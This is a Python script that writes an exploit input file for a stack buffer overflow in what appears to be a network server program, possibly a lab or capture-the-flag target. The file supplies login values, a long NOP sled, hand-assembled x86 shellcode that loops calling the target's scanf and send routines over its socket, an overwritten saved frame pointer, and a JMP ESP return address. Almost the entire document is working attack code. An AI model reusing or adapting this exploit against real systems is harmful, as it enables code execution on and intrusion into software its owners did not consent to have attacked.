jmp_esp_addr = 0x62502028#0x625019BD


f = open("input.txt", "w")
f.write("""archer
VGPF24IDKK45SBP3
PEEK
""")
f.close()
f = open("input.txt", "ab")
mystr = [ord(i) for i in "stop nirrrr"]
mystr.append(0)
f.write(bytes(mystr))
#f.write(bytes([0]*(16300-len(mystr))))

sc_arr = bytearray()
sc_arr += b"\x8B\x5D\x08\xBF\x80\x80\x50\x62"# mov ebx, [ebp+8] aka pointer to socket fd
sc_arr += b"\x89\xE5"# move ebp, esp
skip_loop = len(sc_arr)
sc_arr += b"\x68\x25\x73\x00\x00\x89\xE1"# push "%s", mov "%s" ptr to ecx
sc_arr += b"\x81\xEC\x00\x04\x00\x00\x54\x51\xE8\x3E\x6F\xF0\x61" #calling scanf
#sc_arr += b"\x59\x59\x68\x6E\x29\x00\x00\x68\x41\x64\x6D\x69\x68\x65\x72\x20\x28\x68\x61\x72\x63\x68\x68\x6F\x6D\x65\x20\x68\x57\x65\x6C\x63\x89\xE2\x6A\x00\x52\x51\x6A\x07\x53\xE8\xCE\x3B\xF0\x61\x89\xEC\x90" # calling send_server
sc_arr += b"\x59\x59\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6A\x00\x57\x51\x6A\x07\x53\xE8\xCE\x3B\xF0\x61\x89\xEC\x90" # calling send_server
#sc_arr += b"\x59\x59\x68\x6E\x29\x00\x00\x68\x41\x64\x6D\x69\x68\x65\x72\x20\x28\x68\x61\x72\x63\x68\x68\x6F\x6D\x65\x20\x68\x57\x65\x6C\x63\x89\xE2\x6A\x00\x52\x51\x6A\x07\x53\x90\x90\x90\x90\x90\x83\xC4\x2C" # calling NOPs
sc_arr += b"\xE9\xB6\xFF\xFF\xFF" #jmp to start of our code (loop)
f.write(bytes([0x90]*(16300-len(mystr) - len(sc_arr)))) # TODO: change back to 0
f.write(sc_arr)
f.write(0x5FFD7C.to_bytes(4, "little")) # old ebp
f.write(jmp_esp_addr.to_bytes(4, "little"))
f.write(b"\xE9\x9F\xFF\xFF\xFF") #jmp to start of our code (first time)
f.write(b"\n")
#peek inputs
f.write(b"abc\n")
f.write(b"def\n")
f.write(b"1234\n")
f.write(b"1234\n")
f.write(b"1234\n")
f.write(b"1234\n")
f.write(b"1234\n")
f.write(b"1234\n")
f.write(b"1234\n")

f.close()
print(len(sc_arr) - skip_loop)

#jump from: 005fdcd9
#jump to: 005fdc75

#TODO: FIX scanf/send_to_server OFFSETS

#send_to_server
#to 62501892
#from 005fdcc4